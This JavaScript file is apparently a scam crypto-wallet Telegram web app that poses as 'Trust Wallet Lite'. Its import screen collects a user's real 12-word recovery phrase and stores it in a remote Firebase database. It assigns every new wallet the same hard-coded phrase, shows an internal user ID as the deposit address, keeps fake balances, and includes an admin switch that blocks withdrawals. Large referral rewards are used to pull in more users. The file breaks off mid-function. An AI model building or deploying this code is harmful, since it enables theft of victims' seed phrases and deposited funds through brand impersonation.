// ============================================================================
// TRUST WALLET LITE - FULL VERSION 3.2
// All features: Wallet, Swap, Referral, TWT Pay, Settings, Admin Panel
// ============================================================================

// ====== 1. TELEGRAM WEBAPP INITIALIZATION ======
const tg = window.Telegram?.WebApp;
if (tg) {
    tg.ready();
    tg.expand();
    tg.enableClosingConfirmation?.();
    console.log("✅ Telegram WebApp initialized");
}

// ====== 2. FIREBASE CONFIGURATION ======
const firebaseConfig = {
    apiKey: "{{FIREBASE_API_KEY}}",
    authDomain: "{{FIREBASE_AUTH_DOMAIN}}",
    projectId: "{{FIREBASE_PROJECT_ID}}",
    storageBucket: "{{FIREBASE_STORAGE_BUCKET}}",
    messagingSenderId: "{{FIREBASE_MESSAGING_SENDER_ID}}",
    appId: "{{FIREBASE_APP_ID}}"
};

let db = null;
let userData = null;
let isAdmin = false;
let currentLanguage = localStorage.getItem('preferred_language') || 'en';
let currentTheme = localStorage.getItem('theme') || 'light';
let currentPage = 'wallet';
let TWT_PRICE = 1.25;
let livePrices = {};
let unreadNotifications = 0;

// Initialize Firebase
try {
    if (typeof firebase !== 'undefined') {
        firebase.initializeApp(firebaseConfig);
        db = firebase.firestore();
        console.log("✅ Firebase initialized");
    }
} catch (error) {
    console.error("Firebase init error:", error);
}

// ====== 3. CONSTANTS ======
const BOT_LINK = "https://t.me/TrustTgWalletbot/TWT";
const ADMIN_ID = "{{ADMIN_ID}}";
const REFERRAL_BONUS = 25;
const SWAP_FEE_PERCENT = 0.003;

const ALL_ASSETS = [
    { symbol: 'TWT', name: 'Trust Wallet Token' },
    { symbol: 'USDT', name: 'Tether' },
    { symbol: 'BNB', name: 'BNB' },
    { symbol: 'BTC', name: 'Bitcoin' },
    { symbol: 'ETH', name: 'Ethereum' },
    { symbol: 'SOL', name: 'Solana' },
    { symbol: 'TRX', name: 'TRON' },
    { symbol: 'ADA', name: 'Cardano' },
    { symbol: 'DOGE', name: 'Dogecoin' },
    { symbol: 'SHIB', name: 'Shiba Inu' },
    { symbol: 'PEPE', name: 'Pepe' },
    { symbol: 'TON', name: 'Toncoin' }
];

const REFERRAL_MILESTONES = [
    { referrals: 5, reward: 25, unit: 'USDT', icon: 'fa-star' },
    { referrals: 10, reward: 50, unit: 'USDT', icon: 'fa-medal' },
    { referrals: 25, reward: 120, unit: 'USDT', icon: 'fa-medal' },
    { referrals: 50, reward: 250, unit: 'USDT', icon: 'fa-crown' },
    { referrals: 100, reward: 500, unit: 'USDT', icon: 'fa-crown' },
    { referrals: 250, reward: 1000, unit: 'USDT', icon: 'fa-gem' },
    { referrals: 500, reward: 2500, unit: 'USDT', icon: 'fa-gem' },
    { referrals: 1000, reward: 5000, unit: 'USDT', icon: 'fa-diamond' }
];

const WITHDRAW_FEES = {
    TWT: 1, USDT: 0.16, BNB: 0.0005, BTC: 0.0002, ETH: 0.001,
    SOL: 0.005, TRX: 1, ADA: 0.5, DOGE: 1, SHIB: 50000, PEPE: 500000, TON: 0.1
};

const WITHDRAW_MINIMUMS = {
    TWT: 10, USDT: 10, BNB: 0.02, BTC: 0.0005, ETH: 0.005,
    SOL: 0.12, TRX: 40, ADA: 10, DOGE: 50, SHIB: 500000, PEPE: 5000000, TON: 1
};

const CMC_ICONS = {
    TWT: 'https://s2.coinmarketcap.com/static/img/coins/64x64/5964.png',
    USDT: 'https://s2.coinmarketcap.com/static/img/coins/64x64/825.png',
    BNB: 'https://s2.coinmarketcap.com/static/img/coins/64x64/1839.png',
    BTC: 'https://s2.coinmarketcap.com/static/img/coins/64x64/1.png',
    ETH: 'https://s2.coinmarketcap.com/static/img/coins/64x64/1027.png',
    SOL: 'https://s2.coinmarketcap.com/static/img/coins/64x64/5426.png',
    TRX: 'https://s2.coinmarketcap.com/static/img/coins/64x64/1958.png',
    ADA: 'https://s2.coinmarketcap.com/static/img/coins/64x64/2010.png',
    DOGE: 'https://s2.coinmarketcap.com/static/img/coins/64x64/74.png',
    SHIB: 'https://s2.coinmarketcap.com/static/img/coins/64x64/5994.png',
    PEPE: 'https://s2.coinmarketcap.com/static/img/coins/64x64/24478.png',
    TON: 'https://s2.coinmarketcap.com/static/img/coins/64x64/11419.png'
};

const WELCOME_STICKERS = ['🤝', '🫣', '🥰', '🥳', '💲', '💰', '💸', '💵', '🤪', '😱', '😤', '😎', '🤑', '💯', '💖', '✨', '🌟', '⭐', '🔥', '⚡', '💎', '🔔', '🎁', '🎈', '🎉', '🎊', '👑', '🚀', '💫'];

// ====== 4. TRANSLATIONS ======
const translations = {
    en: {
        'nav.wallet': 'Wallet', 'nav.swap': 'Swap', 'nav.referral': 'Referral',
        'nav.twtpay': 'TWT Pay', 'nav.settings': 'Settings',
        'actions.send': 'Send', 'actions.receive': 'Receive', 'actions.deposit': 'Deposit',
        'actions.withdraw': 'Withdraw', 'actions.history': 'History',
        'wallet.totalBalance': 'Total Balance',
        'swap.from': 'From', 'swap.to': 'To', 'swap.exchangeRate': 'Exchange Rate',
        'swap.swapperFee': 'Swapper fee', 'swap.confirm': 'Confirm Swap',
        'referral.totalReferrals': 'Total Referrals',
        'referral.twtEarned': 'TWT Earned', 'referral.usdtEarned': 'USDT Earned',
        'referral.yourLink': 'Your Referral Link', 'referral.milestones': 'Referral Milestones',
        'settings.language': 'Language', 'settings.theme': 'Theme',
        'settings.recovery': 'Recovery Phrase', 'settings.logout': 'Logout',
        'notifications.title': 'Notifications',
        'success.swapCompleted': 'Swap completed successfully!',
        'success.referralCopied': 'Referral link copied!',
        'success.addressCopied': 'Address copied!'
    },
    ar: {
        'nav.wallet': 'المحفظة', 'nav.swap': 'تحويل', 'nav.referral': 'إحالة',
        'nav.twtpay': 'TWT Pay', 'nav.settings': 'الإعدادات',
        'actions.send': 'إرسال', 'actions.receive': 'استلام', 'actions.deposit': 'إيداع',
        'actions.withdraw': 'سحب', 'actions.history': 'السجل',
        'wallet.totalBalance': 'الرصيد الإجمالي',
        'swap.from': 'من', 'swap.to': 'إلى', 'swap.exchangeRate': 'سعر الصرف',
        'swap.swapperFee': 'رسوم التحويل', 'swap.confirm': 'تأكيد التحويل',
        'referral.totalReferrals': 'إجمالي الإحالات',
        'referral.twtEarned': 'TWT المكتسبة', 'referral.usdtEarned': 'USDT المكتسبة',
        'referral.yourLink': 'رابط الإحالة', 'referral.milestones': 'مراحل الإحالة',
        'settings.language': 'اللغة', 'settings.theme': 'المظهر',
        'settings.recovery': 'عبارة الاسترداد', 'settings.logout': 'تسجيل الخروج',
        'notifications.title': 'الإشعارات',
        'success.swapCompleted': 'تم التحويل بنجاح!',
        'success.referralCopied': 'تم نسخ رابط الإحالة!',
        'success.addressCopied': 'تم نسخ العنوان!'
    }
};

function t(key, params = {}) {
    let text = translations[currentLanguage]?.[key] || translations.en[key] || key;
    Object.keys(params).forEach(param => {
        text = text.replace(`{${param}}`, params[param]);
    });
    return text;
}

function toggleLanguage() {
    currentLanguage = currentLanguage === 'en' ? 'ar' : 'en';
    localStorage.setItem('preferred_language', currentLanguage);
    const flagEl = document.getElementById('currentLanguageFlag');
    if (flagEl) flagEl.textContent = currentLanguage === 'en' ? '🇬🇧' : '🇸🇦';
    if (currentLanguage === 'ar') {
        document.body.classList.add('rtl');
        document.documentElement.dir = 'rtl';
    } else {
        document.body.classList.remove('rtl');
        document.documentElement.dir = 'ltr';
    }
    updateAllTexts();
    if (currentPage === 'settings') renderSettings();
    showToast('Language changed', 'success');
}

function updateAllTexts() {
    document.querySelectorAll('[data-i18n]').forEach(el => {
        const key = el.getAttribute('data-i18n');
        el.textContent = t(key);
    });
}

function toggleTheme() {
    currentTheme = currentTheme === 'light' ? 'dark' : 'light';
    localStorage.setItem('theme', currentTheme);
    document.documentElement.setAttribute('data-theme', currentTheme);
    const themeIcon = document.querySelector('#themeBtn i');
    if (themeIcon) themeIcon.className = currentTheme === 'dark' ? 'fas fa-sun' : 'fas fa-moon';
}

function initTheme() {
    document.documentElement.setAttribute('data-theme', currentTheme);
    const themeIcon = document.querySelector('#themeBtn i');
    if (themeIcon) themeIcon.className = currentTheme === 'dark' ? 'fas fa-sun' : 'fas fa-moon';
}

// ====== 5. UTILITY FUNCTIONS ======
function getCurrencyIcon(symbol) {
    return CMC_ICONS[symbol] || CMC_ICONS.TWT;
}

function formatBalance(balance, symbol) {
    if (symbol === 'TWT') return balance.toLocaleString() + ' TWT';
    if (symbol === 'USDT') return '$' + balance.toFixed(2);
    if (symbol === 'BTC') return balance.toFixed(6) + ' BTC';
    if (['BNB', 'ETH', 'SOL', 'TRX', 'ADA', 'TON'].includes(symbol)) return balance.toFixed(4) + ' ' + symbol;
    if (['DOGE', 'SHIB', 'PEPE'].includes(symbol)) return balance.toLocaleString() + ' ' + symbol;
    return balance.toFixed(2) + ' ' + symbol;
}

function formatNumber(num) {
    if (num >= 1e6) return (num / 1e6).toFixed(2) + 'M';
    if (num >= 1e3) return (num / 1e3).toFixed(2) + 'K';
    if (num < 0.0001) return num.toFixed(8);
    if (num < 0.01) return num.toFixed(6);
    return num.toFixed(2);
}

function showToast(message, type = 'success') {
    const toast = document.getElementById('toast');
    const toastMessage = document.getElementById('toastMessage');
    if (!toast) return;
    toastMessage.textContent = message;
    toast.classList.remove('hidden');
    const icon = toast.querySelector('i');
    if (icon) {
        if (type === 'success') icon.className = 'fa-regular fa-circle-check';
        else if (type === 'error') icon.className = 'fa-regular fa-circle-xmark';
        else icon.className = 'fa-regular fa-circle-info';
    }
    setTimeout(() => toast.classList.add('hidden'), 3000);
}

function closeModal(modalId) {
    const modal = document.getElementById(modalId);
    if (modal) modal.classList.remove('show');
}

function copyToClipboard(text) {
    navigator.clipboard.writeText(text);
    showToast(t('success.addressCopied'), 'success');
}

function scrollToTop() {
    window.scrollTo({ top: 0, behavior: 'smooth' });
}

// ====== 6. STICKER SYSTEM ======
let lastStickerTime = 0;
const STICKER_COOLDOWN = 12 * 60 * 1000;

function showRandomSticker() {
    const now = Date.now();
    if (now - lastStickerTime < STICKER_COOLDOWN) return;
    const stickerElement = document.getElementById('welcomeSticker');
    if (!stickerElement) return;
    const randomSticker = WELCOME_STICKERS[Math.floor(Math.random() * WELCOME_STICKERS.length)];
    stickerElement.textContent = randomSticker;
    stickerElement.classList.remove('sticker-pop', 'sticker-shake');
    void stickerElement.offsetWidth;
    stickerElement.classList.add('sticker-pop');
    setTimeout(() => stickerElement.classList.add('sticker-shake'), 200);
    setTimeout(() => {
        stickerElement.classList.remove('sticker-pop', 'sticker-shake');
        setTimeout(() => stickerElement.textContent = '', 300);
    }, 3000);
    lastStickerTime = now;
}

// ====== 7. FETCH PRICES ======
async function fetchLivePrices() {
    try {
        const ids = ['trust-wallet-token', 'tether', 'binancecoin', 'bitcoin', 'ethereum', 'solana', 'tron', 'cardano', 'dogecoin', 'shiba-inu', 'pepe', 'the-open-network'];
        const response = await fetch(`https://api.coingecko.com/api/v3/simple/price?ids=${ids.join(',')}&vs_currencies=usd&include_24hr_change=true`);
        const data = await response.json();
        
        const priceMap = {
            'trust-wallet-token': 'TWT', 'tether': 'USDT', 'binancecoin': 'BNB',
            'bitcoin': 'BTC', 'ethereum': 'ETH', 'solana': 'SOL', 'tron': 'TRX',
            'cardano': 'ADA', 'dogecoin': 'DOGE', 'shiba-inu': 'SHIB',
            'pepe': 'PEPE', 'the-open-network': 'TON'
        };
        
        for (const [id, symbol] of Object.entries(priceMap)) {
            if (data[id]) {
                livePrices[symbol] = { price: data[id].usd, change: data[id].usd_24h_change || 0 };
            }
        }
        
        if (livePrices.TWT) TWT_PRICE = livePrices.TWT.price;
        else TWT_PRICE = 1.25;
        
        updatePrices();
    } catch (error) {
        console.error("Price fetch error:", error);
    }
}

function updatePrices() {
    renderAssets();
    updateTotalBalance();
    if (currentPage === 'swap') calculateSwap();
}

function refreshPrices() {
    fetchLivePrices();
    showToast('Prices refreshed!', 'success');
}

// ====== 8. USER DATA MANAGEMENT ======
function getUserId() {
    return localStorage.getItem('twt_user_id') || null;
}

function saveUserData() {
    if (userData) {
        localStorage.setItem(`user_${userData.userId}`, JSON.stringify(userData));
        if (db && userData) {
            db.collection('users').doc(userData.userId).set(userData).catch(console.error);
        }
    }
}

function loadUserData() {
    const userId = getUserId();
    if (!userId) return false;
    
    const saved = localStorage.getItem(`user_${userId}`);
    if (saved) {
        userData = JSON.parse(saved);
        isAdmin = (userId === ADMIN_ID);
        return true;
    }
    return false;
}

function updateTotalBalance() {
    if (!userData) return;
    let total = userData.balances.USDT || 0;
    total += (userData.balances.TWT || 0) * (livePrices.TWT?.price || TWT_PRICE);
    total += (userData.balances.BNB || 0) * (livePrices.BNB?.price || 580);
    total += (userData.balances.BTC || 0) * (livePrices.BTC?.price || 65000);
    total += (userData.balances.ETH || 0) * (livePrices.ETH?.price || 3400);
    total += (userData.balances.SOL || 0) * (livePrices.SOL?.price || 150);
    total += (userData.balances.TRX || 0) * (livePrices.TRX?.price || 0.25);
    total += (userData.balances.ADA || 0) * (livePrices.ADA?.price || 0.45);
    total += (userData.balances.DOGE || 0) * (livePrices.DOGE?.price || 0.15);
    total += (userData.balances.SHIB || 0) * (livePrices.SHIB?.price || 0.000025);
    total += (userData.balances.PEPE || 0) * (livePrices.PEPE?.price || 0.000015);
    total += (userData.balances.TON || 0) * (livePrices.TON?.price || 5.50);
    
    const totalElement = document.getElementById('totalBalance');
    if (totalElement) totalElement.textContent = '$' + total.toFixed(2);
}

function updateUI() {
    renderAssets();
    updateTotalBalance();
    updateReferralStats();
    updateNotificationBadge();
    if (currentPage === 'swap') updateSwapBalances();
    if (currentPage === 'twtpay') renderTWTPay();
}

function updateNotificationBadge() {
    const badge = document.querySelector('.badge');
    if (badge && userData) {
        unreadNotifications = userData.notifications?.filter(n => !n.read).length || 0;
        badge.textContent = unreadNotifications;
        badge.style.display = unreadNotifications > 0 ? 'block' : 'none';
    }
}

function checkAdminAndAddCrown() {
    const crownBtn = document.getElementById('adminCrownBtn');
    if (crownBtn) {
        if (isAdmin) crownBtn.classList.remove('hidden');
        else crownBtn.classList.add('hidden');
    }
}

function addNotification(message, type = 'info') {
    if (!userData) return;
    const notification = {
        id: Date.now().toString(),
        message: message,
        type: type,
        read: false,
        timestamp: new Date().toISOString()
    };
    if (!userData.notifications) userData.notifications = [];
    userData.notifications.unshift(notification);
    saveUserData();
    updateNotificationBadge();
}

// ====== 9. CREATE & IMPORT WALLET ======
async function createNewWallet() {
    const btn = document.getElementById('createWalletBtn');
    if (!btn) return;
    
    const originalText = btn.innerHTML;
    btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Creating...';
    btn.disabled = true;
    
    try {
        const userId = 'user_' + Date.now() + '_' + Math.random().toString(36).substr(2, 6);
        localStorage.setItem('twt_user_id', userId);
        
        const newUserData = {
            userId: userId,
            userName: 'User',
            referralCode: userId.slice(-8).toUpperCase(),
            balances: {
                TWT: 0, USDT: 0, BNB: 0, BTC: 0, ETH: 0,
                SOL: 0, TRX: 0, ADA: 0, DOGE: 0, SHIB: 0, PEPE: 0, TON: 0
            },
            referralCount: 0,
            referredBy: null,
            totalTwtEarned: 0,
            totalUsdtEarned: 0,
            referralMilestones: REFERRAL_MILESTONES.map(m => ({ ...m, claimed: false })),
            notifications: [
                { id: '1', message: '🎉 Welcome to Trust Wallet Lite!', type: 'success', read: false, timestamp: new Date().toISOString() }
            ],
            withdrawalRequests: [],
            transactions: [],
            depositAddresses: {},
            withdrawBlocked: false,
            createdAt: new Date().toISOString(),
            recoveryPhrase: ['apple', 'banana', 'cherry', 'dragon', 'eagle', 'forest', 'green', 'happy', 'island', 'jungle', 'king', 'light'].join(' ')
        };
        
        if (db) {
            await db.collection('users').doc(userId).set(newUserData);
            console.log("✅ User saved to Firebase");
        }
        
        userData = newUserData;
        saveUserData();
        isAdmin = (userId === ADMIN_ID);
        
        showMainApp();
        updateUI();
        checkAdminAndAddCrown();
        showToast('✅ Wallet created successfully!', 'success');
        
    } catch (error) {
        console.error("Error:", error);
        showToast('Failed to create wallet', 'error');
    } finally {
        btn.innerHTML = originalText;
        btn.disabled = false;
    }
}

function showImportModal() {
    const grid = document.getElementById('wordsGrid');
    if (grid) {
        grid.innerHTML = '';
        for (let i = 1; i <= 12; i++) {
            grid.innerHTML += `
                <div class="word-field">
                    <div class="word-label">${i}</div>
                    <input type="text" id="word_${i}" class="word-input" placeholder="word ${i}" autocomplete="off">
                </div>
            `;
        }
    }
    document.getElementById('importModal').classList.add('show');
}

async function importWallet() {
    const words = [];
    for (let i = 1; i <= 12; i++) {
        const word = document.getElementById(`word_${i}`)?.value.trim();
        if (!word) {
            showToast(`Please enter word ${i}`, 'error');
            return;
        }
        words.push(word);
    }
    
    const recoveryPhrase = words.join(' ');
    const btn = document.getElementById('confirmImportBtn');
    if (!btn) return;
    
    const originalText = btn.innerHTML;
    btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Importing...';
    btn.disabled = true;
    
    try {
        const userId = 'user_' + Date.now() + '_' + Math.random().toString(36).substr(2, 6);
        localStorage.setItem('twt_user_id', userId);
        
        const newUserData = {
            userId: userId,
            userName: 'User',
            recoveryPhrase: recoveryPhrase,
            referralCode: userId.slice(-8).toUpperCase(),
            balances: {
                TWT: 0, USDT: 0, BNB: 0, BTC: 0, ETH: 0,
                SOL: 0, TRX: 0, ADA: 0, DOGE: 0, SHIB: 0, PEPE: 0, TON: 0
            },
            referralCount: 0,
            referredBy: null,
            totalTwtEarned: 0,
            totalUsdtEarned: 0,
            referralMilestones: REFERRAL_MILESTONES.map(m => ({ ...m, claimed: false })),
            notifications: [
                { id: '1', message: '🎉 Wallet imported successfully!', type: 'success', read: false, timestamp: new Date().toISOString() }
            ],
            withdrawalRequests: [],
            transactions: [],
            depositAddresses: {},
            withdrawBlocked: false,
            createdAt: new Date().toISOString()
        };
        
        if (db) {
            await db.collection('users').doc(userId).set(newUserData);
            console.log("✅ User saved to Firebase");
        }
        
        userData = newUserData;
        saveUserData();
        isAdmin = (userId === ADMIN_ID);
        
        closeModal('importModal');
        showMainApp();
        updateUI();
        checkAdminAndAddCrown();
        showToast('✅ Wallet imported successfully!', 'success');
        
    } catch (error) {
        console.error("Error:", error);
        showToast('Failed to import wallet', 'error');
    } finally {
        btn.innerHTML = originalText;
        btn.disabled = false;
    }
}

// ====== 10. WALLET SECTION ======
function renderAssets() {
    const container = document.getElementById('assetsList');
    if (!container || !userData) return;
    
    container.innerHTML = ALL_ASSETS.map(asset => {
        const balance = userData.balances[asset.symbol] || 0;
        const price = livePrices[asset.symbol]?.price || (asset.symbol === 'TWT' ? TWT_PRICE : 0);
        const value = asset.symbol === 'USDT' ? balance : balance * price;
        const change = livePrices[asset.symbol]?.change || 0;
        const changeClass = change >= 0 ? 'positive' : 'negative';
        const changeSymbol = change >= 0 ? '+' : '';
        
        return `
            <div class="asset-item" onclick="showAssetDetails('${asset.symbol}')">
                <div class="asset-left">
                    <img src="${getCurrencyIcon(asset.symbol)}" class="asset-icon-img">
                    <div class="asset-info">
                        <h4>${asset.name}</h4>
                        <p>${asset.symbol} <span class="asset-change ${changeClass}">${changeSymbol}${change.toFixed(2)}%</span></p>
                    </div>
                </div>
                <div class="asset-right">
                    <div class="asset-balance">${formatBalance(balance, asset.symbol)}</div>
                    <div class="asset-value">$${formatNumber(value)}</div>
                </div>
            </div>
        `;
    }).join('');
}

function showAssetDetails(symbol) {
    const balance = userData.balances[symbol] || 0;
    const price = symbol === 'TWT' ? TWT_PRICE : livePrices[symbol]?.price || 0;
    const value = symbol === 'USDT' ? balance : balance * price;
    showToast(`${symbol}: ${formatBalance(balance, symbol)} ($${formatNumber(value)})`, 'info');
}

function renderWallet() {
    const container = document.getElementById('walletContainer');
    if (!container) return;
    
    container.innerHTML = `
        <div class="balance-card">
            <div class="total-balance" id="totalBalance">$0</div>
            <div class="balance-change"><i class="fas fa-arrow-up"></i><span>+2.5% from last week</span></div>
        </div>
        <div class="action-buttons">
            <button class="action-btn" onclick="showDepositModal()"><i class="fas fa-plus-circle"></i><span>${t('actions.deposit')}</span></button>
            <button class="action-btn" onclick="showWithdrawModal()"><i class="fas fa-minus-circle"></i><span>${t('actions.withdraw')}</span></button>
            <button class="action-btn" onclick="showSendModal()"><i class="fas fa-paper-plane"></i><span>${t('actions.send')}</span></button>
            <button class="action-btn" onclick="showReceiveModal()"><i class="fas fa-qrcode"></i><span>${t('actions.receive')}</span></button>
            <button class="action-btn" onclick="showHistory()"><i class="fas fa-history"></i><span>${t('actions.history')}</span></button>
        </div>
        <div class="section-tabs">
            <button class="section-tab active" onclick="showAssetsTab()">Assets</button>
            <button class="section-tab" onclick="showStakingTab()">Staking</button>
        </div>
        <div id="assetsList" class="assets-list"></div>
    `;
    
    renderAssets();
    updateTotalBalance();
}

function showAssetsTab() {
    renderAssets();
}

function showStakingTab() {
    const assetsList = document.getElementById('assetsList');
    if (assetsList) {
        assetsList.innerHTML = '<div style="text-align:center;padding:40px;">🔜 Staking coming soon!</div>';
    }
}

// ====== 11. SWAP SECTION ======
let swapFromCurrency = 'TWT';
let swapToCurrency = 'USDT';

function renderSwap() {
    const container = document.getElementById('swapContainer');
    if (!container) return;
    
    container.innerHTML = `
        <div class="swap-container">
            <div class="swap-box">
                <div class="swap-label">${t('swap.from')}</div>
                <div class="swap-row">
                    <input type="number" id="swapFromAmount" placeholder="0.00" oninput="calculateSwap()">
                    <div class="currency-selector-small" onclick="showSwapCurrencySelector('from')">
                        <img id="swapFromIcon" src="${getCurrencyIcon(swapFromCurrency)}">
                        <span id="swapFromSymbol">${swapFromCurrency}</span>
                        <i class="fas fa-chevron-down"></i>
                    </div>
                </div>
                <div class="balance-hint">
                    Balance: <span id="swapFromBalance">0</span>
                    <span class="percentage-buttons">
                        <button onclick="setSwapPercentage(25)">25%</button>
                        <button onclick="setSwapPercentage(50)">50%</button>
                        <button onclick="setSwapPercentage(100)">Max</button>
                    </span>
                </div>
            </div>
            
            <div class="swap-arrow" onclick="swapDirection()"><i class="fas fa-arrow-down"></i></div>
            
            <div class="swap-box">
                <div class="swap-label">${t('swap.to')}</div>
                <div class="swap-row">
                    <input type="number" id="swapToAmount" placeholder="0.00" readonly>
                    <div class="currency-selector-small" onclick="showSwapCurrencySelector('to')">
                        <img id="swapToIcon" src="${getCurrencyIcon(swapToCurrency)}">
                        <span id="swapToSymbol">${swapToCurrency}</span>
                        <i class="fas fa-chevron-down"></i>
                    </div>
                </div>
                <div class="balance-hint">Balance: <span id="swapToBalance">0</span></div>
            </div>
            
            <div class="swap-rate" id="swapRateDisplay">1 ${swapFromCurrency} ≈ ${(TWT_PRICE).toFixed(4)} ${swapToCurrency}</div>
            <div class="swap-fee"><span>${t('swap.swapperFee')}</span><span id="swapFee">$0.00</span></div>
            
            <button class="btn-primary" onclick="confirmSwap()"><i class="fas fa-exchange-alt"></i> ${t('swap.confirm')}</button>
        </div>
    `;
    
    updateSwapBalances();
    calculateSwap();
}

function updateSwapBalances() {
    if (!userData) return;
    document.getElementById('swapFromBalance').textContent = userData.balances[swapFromCurrency] || 0;
    document.getElementById('swapToBalance').textContent = userData.balances[swapToCurrency] || 0;
}

function showSwapCurrencySelector(type) {
    currentCurrencySelector = type;
    const modal = document.getElementById('currencySelectorModal');
    const currencyList = document.getElementById('currencyList');
    
    currencyList.innerHTML = ALL_ASSETS.map(asset => `
        <div class="currency-list-item" onclick="selectSwapCurrency('${asset.symbol}')">
            <img src="${getCurrencyIcon(asset.symbol)}">
            <div class="currency-list-info"><h4>${asset.name}</h4><p>${asset.symbol}</p></div>
        </div>
    `).join('');
    
    modal.classList.add('show');
}

function selectSwapCurrency(symbol) {
    if (currentCurrencySelector === 'from') {
        swapFromCurrency = symbol;
        document.getElementById('swapFromIcon').src = getCurrencyIcon(symbol);
        document.getElementById('swapFromSymbol').textContent = symbol;
    } else {
        swapToCurrency = symbol;
        document.getElementById('swapToIcon').src = getCurrencyIcon(symbol);
        document.getElementById('swapToSymbol').textContent = symbol;
    }
    closeModal('currencySelectorModal');
    updateSwapBalances();
    calculateSwap();
}

function calculateSwap() {
    const fromAmount = parseFloat(document.getElementById('swapFromAmount').value) || 0;
    
    let fromPrice = swapFromCurrency === 'TWT' ? TWT_PRICE : (livePrices[swapFromCurrency]?.price || 0);
    let toPrice = swapToCurrency === 'TWT' ? TWT_PRICE : (livePrices[swapToCurrency]?.price || 0);
    
    if (fromPrice > 0 && toPrice > 0) {
        const toAmount = (fromAmount * fromPrice) / toPrice;
        document.getElementById('swapToAmount').value = toAmount.toFixed(6);
        
        const fee = fromAmount * fromPrice * SWAP_FEE_PERCENT;
        document.getElementById('swapFee').textContent = `$${fee.toFixed(4)}`;
        document.getElementById('swapRateDisplay').textContent = `1 ${swapFromCurrency} ≈ ${(fromPrice / toPrice).toFixed(6)} ${swapToCurrency}`;
    }
}

function setSwapPercentage(percent) {
    const balance = userData.balances[swapFromCurrency] || 0;
    const amount = balance * (percent / 100);
    document.getElementById('swapFromAmount').value = amount;
    calculateSwap();
}

function swapDirection() {
    const tempCurrency = swapFromCurrency;
    swapFromCurrency = swapToCurrency;
    swapToCurrency = tempCurrency;
    
    document.getElementById('swapFromIcon').src = getCurrencyIcon(swapFromCurrency);
    document.getElementById('swapFromSymbol').textContent = swapFromCurrency;
    document.getElementById('swapToIcon').src = getCurrencyIcon(swapToCurrency);
    document.getElementById('swapToSymbol').textContent = swapToCurrency;
    
    const fromAmount = document.getElementById('swapFromAmount').value;
    document.getElementById('swapFromAmount').value = document.getElementById('swapToAmount').value;
    document.getElementById('swapToAmount').value = fromAmount;
    
    updateSwapBalances();
    calculateSwap();
}

function confirmSwap() {
    const fromAmount = parseFloat(document.getElementById('swapFromAmount').value);
    const toAmount = parseFloat(document.getElementById('swapToAmount').value);
    
    if (!fromAmount || fromAmount <= 0) {
        showToast('Please enter a valid amount', 'error');
        return;
    }
    
    if (userData.balances[swapFromCurrency] < fromAmount) {
        showToast(`Insufficient ${swapFromCurrency} balance`, 'error');
        return;
    }
    
    const fromPrice = swapFromCurrency === 'TWT' ? TWT_PRICE : (livePrices[swapFromCurrency]?.price || 0);
    const fee = fromAmount * fromPrice * SWAP_FEE_PERCENT;
    const feeInCurrency = swapFromCurrency === 'USDT' ? fee / (livePrices.USDT?.price || 1) : fee / fromPrice;
    
    let finalFromAmount = fromAmount;
    if (swapFromCurrency === 'USDT') {
        finalFromAmount = fromAmount - feeInCurrency;
    }
    
    if (finalFromAmount <= 0) {
        showToast('Amount too small after fee', 'error');
        return;
    }
    
    userData.balances[swapFromCurrency] -= finalFromAmount;
    userData.balances[swapToCurrency] = (userData.balances[swapToCurrency] || 0) + toAmount;
    
    if (!userData.transactions) userData.transactions = [];
    userData.transactions.unshift({
        type: 'swap',
        fromAmount: finalFromAmount,
        fromCurrency: swapFromCurrency,
        toAmount: toAmount,
        toCurrency: swapToCurrency,
        timestamp: new Date().toISOString()
    });
    
    saveUserData();
    updateUI();
    updateSwapBalances();
    document.getElementById('swapFromAmount').value = '';
    calculateSwap();
    
    showToast(t('success.swapCompleted'), 'success');
}

// ====== 12. DEPOSIT, WITHDRAW, SEND, RECEIVE ======
function showDepositModal() {
    const modal = document.getElementById('depositModal');
    if (modal) modal.classList.add('show');
    updateDepositInfo();
}

function updateDepositInfo() {
    const currency = document.getElementById('depositCurrency')?.value || 'TWT';
    const minAmount = WITHDRAW_MINIMUMS[currency] || 10;
    const addressElement = document.getElementById('depositAddress');
    if (addressElement && userData) {
        addressElement.textContent = userData.userId;
    }
    const minElement = document.getElementById('depositMinAmount');
    if (minElement) minElement.textContent = minAmount;
}

function copyDepositAddress() {
    const address = document.getElementById('depositAddress')?.textContent;
    if (address) copyToClipboard(address);
}

function showWithdrawModal() {
    const modal = document.getElementById('withdrawModal');
    if (modal) modal.classList.add('show');
    updateWithdrawInfo();
}

function updateWithdrawInfo() {
    const currency = document.getElementById('withdrawCurrency')?.value || 'TWT';
    const minAmount = WITHDRAW_MINIMUMS[currency] || 10;
    const fee = WITHDRAW_FEES[currency] || 1;
    
    const minElement = document.getElementById('withdrawMinAmount');
    const feeElement = document.getElementById('withdrawFee');
    
    if (minElement) minElement.textContent = minAmount;
    if (feeElement) feeElement.textContent = fee + ' ' + currency;
}

function submitWithdraw() {
    if (userData?.withdrawBlocked) {
        showToast('Your account is blocked from withdrawals', 'error');
        return;
    }
    
    const currency = document.getElementById('withdrawCurrency')?.value || 'TWT';
    const amount = parseFloat(document.getElementById('withdrawAmount')?.value);
    const address = document.getElementById('withdrawAddress')?.value;
    
    if (!amount || amount <= 0 || !address) {
        showToast('Please fill all fields', 'error');
        return;
    }
    
    const minAmount = WITHDRAW_MINIMUMS[currency] || 10;
    if (amount < minAmount) {
        showToast(`Minimum withdrawal is ${minAmount} ${currency}`, 'error');
        return;
    }
    
    const fee = WITHDRAW_FEES[currency] || 1;
    const totalNeeded = amount + fee;
    
    if (userData.balances[currency] < totalNeeded) {
        showToast(`Insufficient balance (need ${totalNeeded} ${currency})`, 'error');
        return;
    }
    
    userData.balances[currency] -= totalNeeded;
    
    if (!userData.withdrawalRequests) userData.withdrawalRequests = [];
    userData.withdrawalRequests.push({
        id: Date.now().toString(),
        currency: currency,
        amount: amount,
        address: address,
        fee: fee,
        status: 'pending',
        timestamp: new Date().toISOString()
    });
    
    if (!userData.transactions) userData.transactions = [];
    userData.transactions.unshift({
        type: 'withdraw',
        amount: amount,
        currency: currency,
        fee: fee,
        address: address,
        status: 'pending',
        timestamp: new Date().toISOString()
    });
    
    saveUserData();
    updateUI();
    
    closeModal('withdrawModal');
    document.getElementById('withdrawAmount').value = '';
    document.getElementById('withdrawAddress').value = '';
    
    if (isAdmin) addNotification(`💰 New withdrawal request: ${amount} ${currency} from ${userData.userId}`, 'info');
